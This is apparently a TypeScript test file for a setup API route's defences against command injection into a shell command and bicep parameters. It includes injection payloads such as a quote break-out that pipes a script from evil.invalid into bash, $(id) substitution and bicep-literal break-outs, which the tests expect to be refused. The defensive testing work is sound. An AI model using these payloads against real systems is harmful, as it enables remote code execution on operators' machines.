/**
 * Security regression tests for POST /api/setup/identity (#3610).
 *
 * THE DEFECT
 * ----------
 * POST returns two artifacts the product tells a PRIVILEGED HUMAN to use: a
 * `bootstrapScript` shell command to paste into a terminal, and a set of bicep
 * `deployParams`. Both were assembled by interpolating request text straight
 * into single-quoted words with no validation at all:
 *
 *     `EXISTING_CLIENT_ID='${…existingClientId…}'`
 *     `CONSOLE_HOSTS='${consoleHosts}'`
 *     deployParams.loomMsalClientId       = `'${…existingClientId…}'`
 *     deployParams.loomTenantAdminGroupId = `'${adminGroupId}'`
 *
 * One `'` in any of those closes the quoted word, and everything after it is
 * shell syntax in a command line that already carries KEYVAULT_NAME and
 * CONSOLE_RG and ends in `bash scripts/csa-loom/bootstrap-msal-app-reg.sh`.
 * Same class as GHSA-fj7j-qq8g-hqj8 (wire-existing); the sink is the operator's
 * terminal rather than `execSync`.
 *
 * WHAT THIS FILE PINS, AND WHY IN THIS SHAPE
 * ------------------------------------------
 * 1. THE WHOLE POPULATION, NOT ONE FIELD. There are FOUR interpolation sinks
 *    fed by THREE distinct caller-controlled fields (`existingClientId` reaches
 *    two of them — the shell command AND the bicep params, which are separate
 *    paste targets). A test covering only `existingClientId` would pass while
 *    `consoleHosts` and `groupId` stayed wide open — and `consoleHosts` is not
 *    even sent by the wizard UI, so it is reachable ONLY by a direct API call
 *    and is exactly what a UI-driven test would miss. Every field is exercised
 *    against every payload below.
 *
 * 2. AN EMBEDDED POSITIVE CONTROL. Before this PR there was no test of this
 *    route at all (`app/api/setup/__tests__/` had nine specs, none for
 *    `identity`), so a new guard starts from ZERO population and a green run
 *    would be indistinguishable from a run that never executed the route. The
 *    `accepts a legitimate choice` case is that control: it asserts the route
 *    is reachable and that a VALID payload still produces a working command
 *    with the values intact. If the module failed to import or the refusal
 *    logic refused everything, that case goes red.
 *
 * 3. AN EMISSION-SITE INVARIANT (the anti-narrow-bypass control). Per-field
 *    tests only cover the fields that exist today, so the last describe block
 *    reads THIS ROUTE'S SOURCE and classifies every place a value can reach one
 *    of the two paste targets.
 *
 *    The FIRST version of this control counted syntax: exactly one raw `'${…}'`
 *    in the file, and exactly five `q('` calls. That is blind to any sink that
 *    is not a template literal, and the blindness was measured, not theorised —
 *    review of this PR added a sixth sink by CONCATENATION,
 *
 *        deployParams.loomTenantHint = "'" + (((body as any).tenantHint) || "") + "'";
 *
 *    and the counts stayed at 1 and 5: RC=0, 36/36 green, with a live
 *    bicep-literal break-out reaching the response. The counting invariant is
 *    retained (it still catches the template shape — measured RC=1) and it is
 *    still load-bearing: it is what catches an added `q('` call, and the region
 *    interpolation count is what catches an added `${…}` in the emitted text.
 *    {@link unsafeEmissions} widens that — it classifies emission SITES rather
 *    than counting one syntax, over three shapes —
 *    a `deployParams.<key> =` whose right-hand side is neither a static literal
 *    nor a `q()` call; a `${…}` in the emission region that is not a `q()` call;
 *    and any string concatenation in that region at all. Each of those three is
 *    pinned by a control below that mutates the real source in memory, plus a
 *    DISCRIMINATING control proving a correctly-routed sixth sink is accepted —
 *    without it, "flags everything" would look identical to a working
 *    classifier. `emitted deployParams keys` is a fourth, independent detector
 *    that works at RUNTIME and so does not depend on source syntax at all.
 *
 * No test in this file contacts Graph, Azure, or a shell.
 */
import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import fs from 'node:fs';
import path from 'node:path';

// ── session: a signed-in operator (so the tests exercise validation, not 401) ──
const getSessionMock = vi.fn(
  () => ({ claims: { oid: 'aaaaaaaa-1111-2222-3333-444444444444', upn: 'admin@t.com' }, exp: Date.now() / 1000 + 3600 }) as any,
);
vi.mock('@/lib/auth/session', () => ({
  getSession: () => getSessionMock(),
  tenantScopeId: (s: any) => s?.claims?.tid ?? s?.claims?.oid,
}));

// The route builds a UAMI credential at MODULE scope and calls Graph in GET.
// Neither may reach the network here.
vi.mock('@/lib/azure/arm-credential', () => ({
  uamiArmCredential: () => ({ getToken: async () => null }),
}));
vi.mock('@/lib/auth/msal', () => ({ graphBase: () => 'https://graph.example.invalid' }));

/** A syntactically valid Entra application id / group object id. */
const VALID_CLIENT_ID = 'bbbbbbbb-cccc-dddd-eeee-ffffffffffff';
const VALID_GROUP_ID = '11111111-2222-3333-4444-555555555555';

function postReq(body: any) {
  return { url: 'http://x/api/setup/identity', json: async () => body } as any;
}

beforeEach(() => {
  getSessionMock.mockReturnValue({
    claims: { oid: 'aaaaaaaa-1111-2222-3333-444444444444', upn: 'admin@t.com' },
    exp: Date.now() / 1000 + 3600,
  } as any);
});

afterEach(() => {
  vi.restoreAllMocks();
  vi.resetModules();
});

/**
 * The payload shapes that break OUT of a single-quoted shell word, plus the
 * bicep-literal equivalents. `'` ends the quoted word; `$(…)`/backticks
 * substitute a command; `\n` starts a new one; `;`/`|`/`&&` chain one.
 */
const INJECTION_PAYLOADS: Array<[string, string]> = [
  ['quote break-out + command', "x' ; curl http://evil.invalid/s.sh | bash ; '"],
  ['single quote alone', "x'"],
  ['command substitution', 'x$(id)'],
  ['backticks', 'x`id`'],
  ['newline', 'x\necho pwned'],
  ['semicolon', 'x;echo pwned'],
  ['pipe', 'x|echo pwned'],
  ['embedded whitespace', 'x y'],
  ['bicep literal break-out', "x' , loomMsalAppReg: '"],
];

/**
 * Every caller-controlled field that reaches an interpolation sink, with the
 * request shape that makes the route actually EMIT it. `existingClientId`
 * appears once but feeds TWO sinks (bootstrapScript + deployParams).
 */
const CALLER_SINKS: Array<{
  field: string;
  body: (payload: string) => any;
}> = [
  {
    field: 'appRegistration.existingClientId',
    body: (p) => ({ appRegistration: { mode: 'existing', existingClientId: p }, bootstrapAdmin: { mode: 'self' } }),
  },
  {
    field: 'appRegistration.consoleHosts',
    body: (p) => ({ appRegistration: { mode: 'new', consoleHosts: p }, bootstrapAdmin: { mode: 'self' } }),
  },
  {
    field: 'bootstrapAdmin.groupId',
    body: (p) => ({ appRegistration: { mode: 'new' }, bootstrapAdmin: { mode: 'group', groupId: p } }),
  },
];

describe('POST /api/setup/identity — operator-terminal command injection (#3610)', () => {
  // The cross-product: EVERY caller sink against EVERY payload. Scoping this to
  // one field is the narrow bypass that passes CI while the route stays open.
  for (const sink of CALLER_SINKS) {
    it.each(INJECTION_PAYLOADS)(
      `refuses ${sink.field} carrying %s, and emits no command`,
      async (_label, payload) => {
        const { POST } = await import('../identity/route');
        const res = await POST(postReq(sink.body(payload)), undefined as any);

        expect(res.status).toBe(400);
        const j = await res.json();
        expect(j.ok).toBe(false);
        expect(j.field).toBe(sink.field);

        // The load-bearing assertion: NEITHER paste target was produced. The
        // whole response is serialized and searched, so a payload surfacing in
        // deployParams, in bootstrapScript, or anywhere else fails this.
        const serialized = JSON.stringify(j);
        expect(serialized).not.toContain(payload);
        expect(j.apply).toBeUndefined();
      },
    );
  }

  it('refuses an existingClientId that is not a GUID (both sinks, one refusal)', async () => {
    const { POST } = await import('../identity/route');
    const res = await POST(
      postReq({ appRegistration: { mode: 'existing', existingClientId: 'not-a-guid' }, bootstrapAdmin: { mode: 'self' } }),
      undefined as any,
    );
    expect(res.status).toBe(400);
    const j = await res.json();
    expect(j.field).toBe('appRegistration.existingClientId');
    expect(j.apply).toBeUndefined();
  });

  it('refuses a consoleHosts entry that carries a scheme or a path', async () => {
    const { POST } = await import('../identity/route');
    for (const bad of ['https://loom.example.com', 'loom.example.com/callback', 'loom.example.com:8443']) {
      const res = await POST(
        postReq({ appRegistration: { mode: 'new', consoleHosts: bad }, bootstrapAdmin: { mode: 'self' } }),
        undefined as any,
      );
      expect(res.status).toBe(400);
      expect((await res.json()).field).toBe('appRegistration.consoleHosts');
    }
  });

  // ── EMBEDDED POSITIVE CONTROL ──────────────────────────────────────────────
  // Proves the route is reachable and the refusals above are discriminating
  // rather than blanket. Without this, a module that threw on import — or a
  // validator that refused everything — would look identical to a passing run.
  it('accepts a legitimate choice and emits the command with the values intact', async () => {
    const { POST } = await import('../identity/route');
    const res = await POST(
      postReq({
        appRegistration: { mode: 'existing', existingClientId: VALID_CLIENT_ID, consoleHosts: 'loom.example.com, csa-loom.example.org' },
        bootstrapAdmin: { mode: 'group', groupId: VALID_GROUP_ID },
      }),
      undefined as any,
    );

    expect(res.status).toBe(200);
    const j = await res.json();
    expect(j.ok).toBe(true);
    expect(j.applied).toBe(false);
    // The shell command carries both values, single-quoted, and the host list
    // is re-emitted in NORMALIZED form (the caller's stray space is gone —
    // the route emits what it rebuilt from validated tokens, not the raw text).
    expect(j.apply.bootstrapScript).toContain(`EXISTING_CLIENT_ID='${VALID_CLIENT_ID}'`);
    expect(j.apply.bootstrapScript).toContain("CONSOLE_HOSTS='loom.example.com,csa-loom.example.org'");
    expect(j.apply.bootstrapScript).toContain('bash scripts/csa-loom/bootstrap-msal-app-reg.sh');
    // The bicep params carry them too — the second paste target.
    expect(j.apply.deployParams.loomMsalClientId).toBe(`'${VALID_CLIENT_ID}'`);
    expect(j.apply.deployParams.loomTenantAdminGroupId).toBe(`'${VALID_GROUP_ID}'`);
  });

  it('still accepts the default new/self choice with no optional fields', async () => {
    const { POST } = await import('../identity/route');
    const res = await POST(postReq({}), undefined as any);
    expect(res.status).toBe(200);
    const j = await res.json();
    expect(j.ok).toBe(true);
    expect(j.appRegistration.mode).toBe('new');
    // The session oid is interpolated too — it is not caller-controlled, but it
    // still passes through the sink guard, so it must survive unchanged.
    expect(j.apply.deployParams.loomTenantAdminOid).toBe("'aaaaaaaa-1111-2222-3333-444444444444'");
  });

  it('an unauthenticated POST gets the byte-exact 401 the hand-rolled prologue returned', async () => {
    getSessionMock.mockReturnValue(null as any);
    const { POST } = await import('../identity/route');
    const res = await POST(postReq({}), undefined as any);
    expect(res.status).toBe(401);
    // withSession → apiUnauthorized() → apiError('unauthenticated', 401).
    // MEASURED equal to the prologue it replaced, not assumed (L4 §4).
    expect(await res.json()).toEqual({ ok: false, error: 'unauthenticated' });
  });
});

describe('POST /api/setup/identity — sink-count invariant', () => {
  /** The route source, verbatim (CRLF preserved). */
  function routeSource(): string {
    return fs.readFileSync(path.join(__dirname, '..', 'identity', 'route.ts'), 'utf8');
  }

  /** Comments stripped, so the worked examples in the module docblock are not
   *  mistaken for live sinks. */
  function stripComments(src: string): string {
    // CRLF-safe: `[\s\S]` and `[^\n]` both work regardless of \r placement.
    return src.replace(/\/\*[\s\S]*?\*\//g, '').replace(/\/\/[^\n]*/g, '');
  }

  function routeCode(): string {
    return stripComments(routeSource());
  }

  it('has exactly ONE raw quoted interpolation, and it is inside q()', () => {
    const code = routeCode();
    // A control on the control: the strip must not have eaten the file.
    expect(code).toContain('export const POST');
    expect(code.length).toBeGreaterThan(1000);

    const rawSinks = code.match(/'\$\{/g) ?? [];
    // ONE — the `return `'${value}'`` inside q(), which is where the inertness
    // assertion lives. A second one means a value reaches a shell/bicep literal
    // without passing INERT_VALUE_RE.
    //
    // This is a NECESSARY condition, not a sufficient one: it sees template
    // interpolation only, so it is blind to a sink built by concatenation.
    // `unsafeEmissions` below closes that WITHIN the emission region; do not
    // read this assertion as "no sink can be added silently", and do not read
    // the pair of them that way either (#3955).
    expect(rawSinks.length).toBe(1);
    expect(code).toMatch(/function q\([^)]*\)[^{]*\{[\s\S]*?INERT_VALUE_RE\.test\(value\)[\s\S]*?'\$\{value\}'/);
  });

  it('routes every emitted value through q() with a named field', () => {
    const code = routeCode();
    const calls = code.match(/\bq\('/g) ?? [];
    // Five emission sites: loomMsalClientId, loomTenantAdminOid,
    // loomTenantAdminGroupId, CONSOLE_HOSTS, EXISTING_CLIENT_ID.
    expect(calls.length).toBe(5);
  });

  // ── EMBEDDED CONTROL FOR L2 ───────────────────────────────────────────────
  // The q() inertness check is a guard whose population is EMPTY as long as the
  // L1 allow-lists hold: every caller field is refused with 400 before it can
  // reach a sink, so a test driving a caller field proves L1 and says nothing
  // about L2. Measured, not theorised — disabling the INERT_VALUE_RE assertion
  // while leaving L1 intact left all 65 tests GREEN (mutation M3). A guard that
  // survives its own removal is not a guard.
  //
  // `session.claims.oid` is L2's LIVE population: it is interpolated into
  // `deployParams.loomTenantAdminOid` and has no L1 allow-list by design (it is
  // not caller input). q() is therefore the ONLY thing between a claim value
  // and an emitted bicep literal, and this case exercises exactly that.
  it('q() refuses a non-inert SESSION-derived value — the sink L1 does not cover', async () => {
    const hostile = "aaaa' , loomMsalAppReg: { enabled: false } , x: '";
    getSessionMock.mockReturnValue({ claims: { oid: hostile, upn: 'admin@t.com' }, exp: Date.now() / 1000 + 3600 } as any);
    const { POST } = await import('../identity/route');
    const res = await POST(postReq({}), undefined as any);

    // Fails CLOSED through withSession's catch → apiServerError (500). What
    // matters is that nothing was emitted, not which status it chose.
    expect(res.status).toBe(500);
    const serialized = JSON.stringify(await res.json());
    expect(serialized).not.toContain(hostile);
    expect(serialized).not.toContain('loomMsalAppReg');
  });

  it('q() lets an inert session oid through unchanged (the discriminating half)', async () => {
    // Without this, "refuses everything" would look identical to a working
    // guard. Synthetic/dev sessions really do carry non-GUID oids like
    // `oid-test`, and those are inert, so they must still work.
    getSessionMock.mockReturnValue({ claims: { oid: 'oid-test', upn: 'admin@t.com' }, exp: Date.now() / 1000 + 3600 } as any);
    const { POST } = await import('../identity/route');
    const res = await POST(postReq({}), undefined as any);
    expect(res.status).toBe(200);
    expect((await res.json()).apply.deployParams.loomTenantAdminOid).toBe("'oid-test'");
  });
});

// ───────────────────────────────────────────────────────────────────────────
// EMISSION-SITE INVARIANT — the widened anti-narrow-bypass control
// ───────────────────────────────────────────────────────────────────────────
// Why this exists rather than the two counting assertions above: review of this
// PR defeated those by writing the sixth sink with `+` instead of `${}`. Counts
// stayed at 1 and 5; RC=0, 36/36; and a bicep-literal break-out landed verbatim
// in a paste target. Counting ONE syntax cannot support the claim "a sink
// cannot be added silently".
//
// Neither can this classifier, and the boundary is measured rather than
// assumed: mutating the real route and running this real suite, FOUR shapes
// stay green at 45/45 — a bare expression as a command-array element; a
// `deployParams.<key> =` whose RHS only MENTIONS `q(`; a concatenation in the
// response object (past REGION_END); and an earlier response `return` that
// relocates REGION_END. What this control DOES carry is the narrow claim:
// inside the region, for the three shapes below, a sink cannot be added
// silently. Widening is #3955.
// ───────────────────────────────────────────────────────────────────────────

/** A single string/template literal with NO interpolation and NO concatenation
 *  — i.e. a constant the route authored itself, which no caller can influence. */
const STATIC_LITERAL_RE = /^(?:'[^'\\]*'|"[^"\\]*"|`[^`$\\]*`)$/;

/** Any string literal adjacent to a `+`. Inside the emission region, building
 *  emitted text by concatenation is forbidden outright — that is the shape the
 *  template-counting invariant is blind to, and there is no legitimate use of
 *  it here, so the rule is "none", not "none that look dangerous". */
const CONCAT_RE = /(?:['"`][^'"`\n]*['"`]\s*\+|\+\s*['"`])/g;

const REGION_START = 'const deployParams';
const REGION_END = 'return NextResponse.json({';

/** The two paste targets are both built between these markers. */
function emissionRegion(code: string): string | null {
  const a = code.indexOf(REGION_START);
  const b = code.indexOf(REGION_END, a);
  if (a < 0 || b < 0) return null;
  return code.slice(a, b);
}

/** Every `deployParams.<key> = <rhs>;` write, file-wide (so a value assembled
 *  outside the region and assigned in is still classified on its RHS). */
function deployParamSites(code: string): Array<{ key: string; rhs: string }> {
  const sites: Array<{ key: string; rhs: string }> = [];
  const re = /deployParams\.(\w+)\s*=\s*([^;]*);/g;
  let m: RegExpExecArray | null;
  while ((m = re.exec(code))) sites.push({ key: m[1], rhs: m[2].trim() });
  return sites;
}

/**
 * THE GUARD. Returns one finding per way a value could reach a paste target
 * without passing q()'s inertness assertion. Empty means the route is clean.
 */
function unsafeEmissions(code: string): string[] {
  const findings: string[] = [];

  // Fail CLOSED if the region markers moved: a classifier that silently found
  // nothing to classify is the empty-population failure, not a pass.
  const region = emissionRegion(code);
  if (region === null) {
    return ['emission region not found — REGION_START/REGION_END markers moved'];
  }

  // (1) deployParams writes: static literal, or routed through q(). Nothing else.
  for (const s of deployParamSites(code)) {
    if (/\bq\(/.test(s.rhs)) continue;
    if (STATIC_LITERAL_RE.test(s.rhs)) continue;
    findings.push(`deployParams.${s.key} is neither a static literal nor a q() call: ${s.rhs}`);
  }
  // (1b) …and the only way to write deployParams is that form.
  if (/deployParams\s*\[/.test(code)) findings.push('deployParams written by computed key');
  if (/Object\.assign\s*\(\s*deployParams/.test(code)) findings.push('deployParams written by Object.assign');

  // (2) every interpolation in the emitted text is a q() call.
  for (const i of region.match(/\$\{[^}]*\}/g) ?? []) {
    if (!/\bq\(/.test(i)) findings.push(`interpolation not routed through q(): ${i}`);
  }

  // (3) no string concatenation builds emitted text — the reviewer's bypass.
  for (const c of region.match(CONCAT_RE) ?? []) {
    findings.push(`string concatenation in the emission region: ${c.trim()}`);
  }

  return findings;
}

describe('POST /api/setup/identity — emission-site invariant', () => {
  function routeSource(): string {
    return fs.readFileSync(path.join(__dirname, '..', 'identity', 'route.ts'), 'utf8');
  }
  function stripComments(src: string): string {
    return src.replace(/\/\*[\s\S]*?\*\//g, '').replace(/\/\/[^\n]*/g, '');
  }
  function mutate(src: string, needle: string, replacement: string): string {
    // CRLF landmine: an LF-written needle matches ZERO times, and a control
    // that mutated nothing is indistinguishable from a control that passed.
    expect(src.split(needle).length - 1).toBe(1);
    return src.replace(needle, replacement);
  }

  /** Where the reviewer's N1 landed: immediately before the shell command. */
  const ANCHOR_PARAMS = '  const bootstrapCmd =';
  /** An element of the shell-command array — the OTHER paste target. */
  const ANCHOR_CMD = "          'CONSOLE_APP_NAME=loom-console CONSOLE_RG=<admin-rg>',";

  it('the live route has no unsafe emission site', () => {
    expect(unsafeEmissions(stripComments(routeSource()))).toEqual([]);
  });

  it('the classifier has a real population (floor, so it cannot pass vacuously)', () => {
    const code = stripComments(routeSource());
    const region = emissionRegion(code);
    expect(region).not.toBeNull();
    expect(region!.length).toBeGreaterThan(400);

    // Every `deployParams.<key> =` token in the file was actually PARSED into a
    // site. If an RHS ever contains a `;` the slice would drop the site and the
    // guard would go quiet — this is the check that notices.
    const tokens = code.match(/deployParams\.\w+\s*=(?!=)/g) ?? [];
    const sites = deployParamSites(code);
    expect(sites.length).toBe(tokens.length);
    // Seven writes today (3 appModes × their params, + oid, + groupId). A floor,
    // not an equality: adding a SAFE site must not require editing this number.
    expect(sites.length).toBeGreaterThanOrEqual(7);
    // Both interpolations in the region are the two q()-wrapped shell values.
    expect((region!.match(/\$\{[^}]*\}/g) ?? []).length).toBe(2);
  });

  // ── PINNED BYPASS CONTROLS ────────────────────────────────────────────────
  // Each mutates the REAL source in memory and asserts the classifier flags it.
  // These are the cases that shipped GREEN before this control existed; they are
  // pinned so the classifier cannot be refactored back into blindness.

  it('CONTROL N1 — a sixth deployParams sink built by CONCATENATION is flagged', () => {
    // Verbatim from the review of PR #3929. Measured on the pre-fix tree:
    // rawSinks=1, qCalls=5, RC=0, 36/36 green — undetected, and exploitable.
    const mutated = mutate(
      routeSource(),
      ANCHOR_PARAMS,
      '  deployParams.loomTenantHint = "\'" + (((body as any).tenantHint) || "") + "\'";\r\n' + ANCHOR_PARAMS,
    );
    const code = stripComments(mutated);

    const findings = unsafeEmissions(code);
    expect(findings.join('\n')).toContain('loomTenantHint');
    expect(findings.length).toBeGreaterThan(0);

    // And the reason a new control was needed: the two counting assertions are
    // blind to this shape. Measured here, in the same run, so the claim in the
    // docblock is checked rather than remembered.
    expect((code.match(/'\$\{/g) ?? []).length).toBe(1);
    expect((code.match(/\bq\('/g) ?? []).length).toBe(5);
  });

  it('CONTROL N2 — a shell-command element built by CONCATENATION is flagged', () => {
    // The same shape aimed at the other paste target. Also measured RC=0 on the
    // pre-fix tree.
    const mutated = mutate(
      routeSource(),
      ANCHOR_CMD,
      '          "TENANT_HINT=\'" + (((body as any).tenantHint) || "") + "\'",\r\n' + ANCHOR_CMD,
    );
    const findings = unsafeEmissions(stripComments(mutated));
    expect(findings.join('\n')).toContain('string concatenation in the emission region');
  });

  it('CONTROL N3 — a raw template interpolation is still flagged (old detection retained)', () => {
    // The shape the counting invariant already caught. Pinned so that widening
    // the guard cannot quietly cost the coverage it already had.
    const mutated = mutate(
      routeSource(),
      ANCHOR_CMD,
      '          `TENANT_HINT=\'${((body as any).tenantHint) || ""}\'`,\r\n' + ANCHOR_CMD,
    );
    const code = stripComments(mutated);
    expect(unsafeEmissions(code).join('\n')).toContain('interpolation not routed through q()');
    expect((code.match(/'\$\{/g) ?? []).length).toBe(2);
  });

  it('CONTROL N5 — an UNQUOTED dynamic deployParams value is flagged', () => {
    // N1 is caught by TWO of the three rules, so it cannot detect the removal
    // of either one on its own. N5 is caught by the deployParams-site rule
    // ALONE: no quote literal, no `+` on a literal, no `${…}`. It is also a real
    // sink — an unquoted bicep param value is exactly how caller text becomes
    // bicep syntax rather than a bicep string.
    const mutated = mutate(
      routeSource(),
      ANCHOR_PARAMS,
      '  deployParams.loomTenantHint = String((body as any).tenantHint);\r\n' + ANCHOR_PARAMS,
    );
    const findings = unsafeEmissions(stripComments(mutated));
    expect(findings.join('\n')).toContain('loomTenantHint is neither a static literal nor a q() call');
  });

  it('CONTROL N4 — a sixth sink CORRECTLY routed through q() is accepted', () => {
    // The discriminating half. Without it, a classifier that flagged everything
    // would look identical to one that works, and the first person to add a
    // legitimate parameter would be told to delete the guard. Note it reads the
    // LIVE file, so it also fails when the live route is itself unsafe — that is
    // intended: every control here is grounded in the real source, not a fixture
    // that models what the code was assumed to look like.
    const mutated = mutate(
      routeSource(),
      ANCHOR_PARAMS,
      "  deployParams.loomTenantHint = q('session.claims.oid', adminOid);\r\n" + ANCHOR_PARAMS,
    );
    expect(unsafeEmissions(stripComments(mutated))).toEqual([]);
  });

  it('CONTROL — a region marker that VANISHES fails CLOSED, it does not go quiet', () => {
    // A guard over an empty population is green and blind. If a marker ever
    // stops matching, the classifier must say so rather than find nothing.
    //
    // Scope, measured rather than assumed: this covers a marker that VANISHES.
    // A marker that MOVES does NOT fail closed — adding an earlier response
    // `return` relocates REGION_END, shrinking the region while it still clears
    // the 400-char floor and still holds its two interpolations, and the suite
    // stays green at 45/45. That is #3955, not something this control catches.
    expect(unsafeEmissions('export const POST = 1;')).toEqual([
      'emission region not found — REGION_START/REGION_END markers moved',
    ]);
  });

  // ── RUNTIME DETECTOR — independent of source syntax entirely ──────────────
  it('emits exactly the pinned deployParams keys, per mode', async () => {
    const { POST } = await import('../identity/route');
    const keys = async (body: any) => {
      const res = await POST(postReq(body), undefined as any);
      expect(res.status).toBe(200);
      return Object.keys((await res.json()).apply.deployParams).sort();
    };

    // A SIXTH key appearing here goes red whatever syntax produced it — a
    // source-scan can be out-thought, and an emitted key cannot be hidden from
    // a request shape this test actually drives. It CAN be hidden from one this
    // test does not: a write guarded by a field none of the three bodies below
    // sends never reaches the emitted set, and stays green. That is the limit
    // of this detector, and it is part of #3955.
    expect(await keys({})).toEqual(['loomMsalAppReg', 'loomTenantAdminOid']);
    expect(
      await keys({ appRegistration: { mode: 'disable' }, bootstrapAdmin: { mode: 'self' } }),
    ).toEqual(['loomMsalAppReg', 'loomMsalClientId', 'loomTenantAdminOid']);
    expect(
      await keys({
        appRegistration: { mode: 'existing', existingClientId: VALID_CLIENT_ID },
        bootstrapAdmin: { mode: 'group', groupId: VALID_GROUP_ID },
      }),
    ).toEqual(['loomMsalAppReg', 'loomMsalClientId', 'loomTenantAdminGroupId']);
  });
});
